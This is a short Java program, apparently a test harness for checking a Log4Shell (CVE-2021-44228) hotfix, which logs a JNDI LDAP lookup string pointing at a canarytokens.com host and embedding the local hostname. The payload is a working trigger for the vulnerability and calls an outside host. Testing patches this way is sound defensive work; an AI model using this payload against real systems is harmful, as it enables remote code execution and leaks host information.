package de.silpion.log4shell.hotfix.side.effect;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.config.DefaultConfiguration;

public class Main implements Runnable {
    static {
        System.setProperty("com.sun.jndi.ldap.connect.timeout", "1000");
        System.setProperty("com.sun.jndi.ldap.read.timeout", "1000");
        System.setProperty(DefaultConfiguration.DEFAULT_LEVEL, Level.INFO.toString());
    }
    private final static Logger LOG = LogManager.getLogger(Main.class);

    private final String[] args;

    public Main(
        final String[] args
    ) {
        this.args = args;
    }

    @Override
    public void run() {
        final String CVE_2021_4428 = "${jndi:ldap://x${hostName}.L4J.cyvu6gfqc6sd34ii51nht76in.canarytokens.com/a}";
        trigger("CVE-2021-44228", args.length > 0 ? args[0] : CVE_2021_4428);
    }

    private void trigger(
        final String description,
        final String gadget
    ) {
        final long ts = System.currentTimeMillis();
        LOG.info("Triggering {}", description);
        LOG.info("Trigger: " + gadget);
        LOG.info("That took {}ms", System.currentTimeMillis() - ts);
    }

    public static void main(
        final String[] args
    ) throws Exception {
        new Main(args).run();
    }
}